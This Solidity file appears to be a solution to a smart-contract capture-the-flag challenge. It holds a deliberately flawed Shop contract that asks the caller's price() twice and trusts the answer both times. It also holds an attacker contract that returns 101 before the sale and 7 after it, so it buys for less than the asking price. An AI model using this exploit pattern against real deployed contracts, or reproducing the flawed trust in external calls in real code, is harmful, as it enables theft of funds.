// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution{
  Shop public shop;

  constructor ( address _addr) {
    shop = Shop(_addr);
  }

  function price() external view returns(uint) {
    if (shop.isSold()) {   // if (isSold == true)
      return 7;}
      return 101;
  }

  function a() external {
    shop.buy();
   require(shop.price() == 7,"not good"); 
  }


}

interface Buyer {
  function price() external returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}